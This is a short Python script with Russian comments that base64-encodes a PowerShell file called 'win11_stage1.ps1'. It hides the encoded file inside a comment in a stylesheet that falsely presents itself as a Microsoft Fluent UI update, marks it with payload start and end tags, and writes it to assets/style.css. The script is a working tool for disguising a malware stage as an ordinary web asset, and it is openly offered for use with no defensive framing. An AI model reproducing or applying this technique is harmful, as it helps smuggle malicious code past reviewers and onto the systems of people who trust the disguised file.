import base64
import textwrap

# Файл с основным payload
with open("payloads/win11_stage1.ps1", "rb") as f:
    encoded = base64.b64encode(f.read()).decode()

# Оформление в виде легитимного CSS
css_legit = """
/* Microsoft Fluent UI CSS – update v10.2025.5.3 */
body {
  font-family: "Segoe UI", system-ui, sans-serif;
  background-color: #f3f3f3;
  color: #1f1f1f;
  font-size: 14px;
  margin: 0;
  padding: 0;
}
.container {
  max-width: 1200px;
  margin: auto;
  padding: 24px;
}
.button {
  background-color: #0078d4;
  border: none;
  color: white;
  padding: 8px 16px;
  font-weight: 500;
  cursor: pointer;
}
.button:hover {
  background-color: #005a9e;
}

/* [payload_start] */
"""

css_legit += "/* " + textwrap.fill(encoded, 100) + " */\n"
css_legit += "/* [payload_end] */\n"

# Сохраняем в style.css
with open("assets/style.css", "w") as f:
    f.write(css_legit)

print("[+] style.css обновлён с зашитым base64 payload.")
